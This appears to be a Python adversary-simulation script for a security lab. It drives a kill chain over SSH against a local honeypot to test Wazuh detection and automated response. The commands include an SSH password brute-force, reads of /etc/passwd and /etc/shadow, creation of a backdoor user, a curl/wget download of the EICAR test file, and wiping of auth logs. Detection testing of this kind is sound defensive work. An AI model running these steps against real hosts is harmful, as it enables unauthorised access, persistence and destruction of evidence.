#!/usr/bin/env python3
"""
Advanced Adversary Simulation (Red Team) - Threat Intelligence Lab.

Drives a real attack over the network against the linux-honeypot on
127.0.0.1:2222. Unlike a scripted `docker exec`, every action here is genuine
SSH traffic, so the honeypot's Wazuh agent detects it and forwards alerts to
the manager - which in turn fires the Active Response and VirusTotal SOAR.

Mapped to:
- Cyber Kill Chain (Lockheed Martin)
- MITRE ATT&CK
- The Diamond Model of Intrusion Analysis

Requires paramiko (see requirements.txt). Target/creds overridable via env:
  HONEYPOT_HOST (default 127.0.0.1)  HONEYPOT_PORT (default 2222)
  HONEYPOT_USER (default root)       HONEYPOT_PASS (default toor)
"""

import argparse
import os
import socket
import time
import sys

import logging

try:
    import paramiko
except ImportError:
    print("[!] paramiko not installed. Run: pip install -r requirements.txt")
    sys.exit(1)

# paramiko's transport thread logs full "Error reading SSH protocol banner"
# tracebacks to stderr on every dropped connection (e.g. once Active Response
# starts blocking us) - regardless of our try/except. Silence it so the sim
# output stays readable; we handle and report connection failures ourselves.
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

HOST = os.environ.get("HONEYPOT_HOST", "127.0.0.1")
PORT = int(os.environ.get("HONEYPOT_PORT", "2222"))
USER = os.environ.get("HONEYPOT_USER", "root")
PASSWORD = os.environ.get("HONEYPOT_PASS", "toor")

# Wrong passwords used to generate real failed-auth events for Wazuh.
WORDLIST = [
    "123456", "password", "admin", "root", "letmein", "qwerty",
    "toor123", "changeme", "password1", "12345678", "welcome", "to0r",
]


def print_phase(phase, name, mitre, diamond, desc):
    bar = "=" * 70
    print(f"\n[{bar}]")
    print(f"| PHASE {phase}: {name}")
    print(f"| MITRE ATT&CK : {mitre}")
    print(f"| DIAMOND MODEL: {diamond}")
    print(f"| DESCRIPTION  : {desc}")
    print(f"[{bar}]")


def try_login(password, retries=3, quiet=False):
    """One SSH auth attempt. Returns a connected client on success, else None.

    Retries transient transport errors ("Error reading SSH protocol banner",
    connection reset) that happen when a busy/emulated sshd briefly drops a
    connection under load - the auth itself never got a verdict, so retrying is
    correct. A real AuthenticationException (wrong password) is NOT retried.
    """
    for attempt in range(1, retries + 1):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                HOST, port=PORT, username=USER, password=password,
                allow_agent=False, look_for_keys=False,
                timeout=10, banner_timeout=15, auth_timeout=15,
            )
            return client
        except paramiko.AuthenticationException:
            client.close()
            return None  # definitive wrong-password
        except (paramiko.SSHException, EOFError, OSError) as exc:
            client.close()
            if attempt < retries:
                time.sleep(1.5 * attempt)  # back off, sshd may be throttling
                continue
            if not quiet:
                print(f"    [!] connection error after {retries} tries: {exc}")
            return None


def ssh_exec(client, command):
    """Run a command on the honeypot over the live SSH session."""
    stdin, stdout, stderr = client.exec_command(command, timeout=15)
    out = stdout.read().decode(errors="ignore")
    err = stderr.read().decode(errors="ignore")
    return (out + err).strip()


def main():
    parser = argparse.ArgumentParser(description="Adversary simulation against the honeypot")
    parser.add_argument(
        "--profile", choices=["skilled", "noise"], default="skilled",
        help="skilled = full kill chain (trips SKILLED tier -> engage -> reads a "
             "lure to trip the tripwire); noise = scan + brute-force only (gets "
             "banned fast, no engagement). Phase C adaptive-engagement demo.")
    args = parser.parse_args()

    print("\n>> INITIATING ADVERSARY SIMULATION <<")
    print(f"Target honeypot: {USER}@{HOST}:{PORT}   profile: {args.profile}\n")
    time.sleep(1)

    # -- PHASE 1: Reconnaissance ------------------------------------------
    print_phase(1, "Reconnaissance", "T1595 (Active Scanning)",
                "Infrastructure", "Probing target for the open SSH service.")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    if s.connect_ex((HOST, PORT)) == 0:
        print(f"[*] SUCCESS: Port {PORT} is OPEN on target.")
    else:
        print(f"[!] Port {PORT} closed - is the honeypot up? Aborting.")
        s.close()
        sys.exit(1)
    s.close()
    time.sleep(1)

    # -- PHASE 2: Delivery & Initial Access (real brute force) ------------
    print_phase(2, "Delivery & Initial Access", "T1110 (Brute Force)",
                "Adversary -> Victim",
                "SSH password brute-force against the weak root login.")

    # Attacker cracks the weak credential quickly and HOLDS that session, then
    # keeps hammering to trip the SIEM's brute-force rule + Active Response.
    # Because the honeypot accepts ESTABLISHED,RELATED traffic and the AR ban is
    # appended (not inserted), the held foothold survives while NEW connections
    # from the attacker get dropped - so this single run exercises detection,
    # the ban, AND the post-exploitation + malware paths.
    print("[*] Probing weak credentials...")
    for i, pw in enumerate(WORDLIST[:4], 1):
        print(f"[*] Attempt {i}: {USER}:{pw}")
        c = try_login(pw, retries=1)
        if c:
            c.close()
        time.sleep(0.3)

    print(f"[*] Trying known weak credential {USER}:{PASSWORD}...")
    session = try_login(PASSWORD)
    if not session:
        print("[!] Could not establish a session. Stopping post-exploitation.")
        return
    print(f"[+] CREDENTIALS CRACKED -> {USER}:{PASSWORD}. Foothold HELD.")

    # Keep hammering (throwaway connections) to push past the brute-force
    # threshold so Wazuh rule 5763 fires and Active Response bans the source.
    print("[*] Continuing the brute-force to trip SIEM detection + Active Response...")
    sent = 0
    for i in range(12):
        # quiet=True: once Active Response bans us mid-burst, further NEW
        # connections are dropped by design - that's the response working, not
        # an error, so we don't spam a failure line per attempt.
        c = try_login(f"rockyou_{i}", retries=1, quiet=True)
        if c:
            c.close()
        sent += 1
        print(f"    [*] burst {sent}/12", end="\r", flush=True)
        time.sleep(0.3)
    print("\n[+] Brute-force burst done. Wazuh should now ban the source IP "
          "(new connections blocked; this foothold persists).")
    time.sleep(2)

    # NOISE profile stops here: a scanner/spray with no post-exploitation. It
    # trips only the brute-force rule, so it's classified low and banned fast -
    # no engagement, no lures. (Phase C: the adaptive lab cuts noise quickly.)
    if args.profile == "noise":
        session.close()
        print("\n=========================================================")
        print("NOISE SIMULATION COMPLETE - brute-force only.")
        print("Expected: fast Active Response ban, NO engagement (no lures).")
        print("=========================================================\n")
        return

    # -- PHASE 3: Execution & Discovery -----------------------------------
    print_phase(3, "Execution & Discovery",
                "T1082 (System Info), T1003 (Credential Dumping)",
                "Capability", "Post-breach recon over the SSH session.")
    for cmd in ("whoami", "uname -a", "cat /etc/passwd", "cat /etc/shadow"):
        out = ssh_exec(session, cmd)
        preview = out.splitlines()[:3]
        print(f"[*] $ {cmd}")
        for line in preview:
            print(f"      {line}")
    time.sleep(1)

    # -- PHASE 4: Persistence ---------------------------------------------
    print_phase(4, "Installation & Persistence", "T1136 (Create Account)",
                "Capability -> Victim", "Creating a backdoor account.")
    print("[*] Creating hidden system user 'sysadmin_bckp'...")
    ssh_exec(session, "useradd -m -s /bin/bash sysadmin_bckp 2>/dev/null; "
                      "echo 'sysadmin_bckp:Backd00r!' | chpasswd")
    print("[+] Backdoor account created.")
    time.sleep(1)

    # -- PHASE 5: Command & Control (malware drop) ------------------------
    print_phase(5, "Command & Control", "T1105 (Ingress Tool Transfer)",
                "Infrastructure -> Capability",
                "Downloading the EICAR test payload via cURL.")
    print("[*] Fetching EICAR payload to /tmp/eicar.com.txt ...")
    ssh_exec(session,
             "curl -s -o /tmp/eicar.com.txt https://secure.eicar.org/eicar.com.txt "
             "|| wget -q -O /tmp/eicar.com.txt https://secure.eicar.org/eicar.com.txt")
    listing = ssh_exec(session, "ls -l /tmp/eicar.com.txt")
    print(f"[+] Payload dropped -> {listing}")
    print("    (FIM should raise a syscheck alert -> VirusTotal integration.)")
    time.sleep(1)

    # -- PHASE 6: Actions on Objectives (Defense Evasion) -----------------
    print_phase(6, "Actions on Objectives (Defense Evasion)",
                "T1070 (Indicator Removal)", "Adversary",
                "Wiping auth logs to cover tracks.")
    print("[*] Clearing /var/log/auth.log ...")
    # Wazuh already forwarded the events in real time, so the trail survives.
    ssh_exec(session, "echo '' > /var/log/auth.log 2>/dev/null; "
                      "rm -f /var/log/syslog 2>/dev/null")
    print("[+] Local logs wiped (but the SIEM already has the evidence).")
    time.sleep(1)

    # -- PHASE 7: Take the bait (Phase C adaptive engagement) --------------
    # By now the sustained multi-category activity has tripped the SKILLED tier
    # (rule 100401), so Active Response has planted decoy lures. A skilled
    # attacker goes looking for creds - reading a planted lure trips the tripwire
    # (rule 100402, the loudest signal) and disengages us (ban).
    print_phase(7, "Take the Bait (Adaptive Engagement)",
                "T1552 (Unsecured Credentials)", "Adversary -> Victim",
                "Hunting for credentials - reads a planted decoy lure.")
    print("[*] Waiting for the honeypot to plant lures (engagement)...")
    time.sleep(6)
    for lure in ("/root/.ssh/id_rsa", "/root/credentials.txt"):
        out = ssh_exec(session, f"cat {lure}")
        got = "FOUND" if out.strip() else "empty/absent"
        print(f"[*] $ cat {lure}   -> {got}")
    print("[+] Decoy read. Tripwire (rule 100402) should now fire + disengage.")

    session.close()
    print("\n=========================================================")
    print("ADVERSARY SIMULATION COMPLETE")
    print("Open the Wazuh dashboard to review the detected Kill Chain,")
    print("the Active Response ban, and the VirusTotal malware verdict.")
    print("=========================================================\n")


if __name__ == "__main__":
    main()
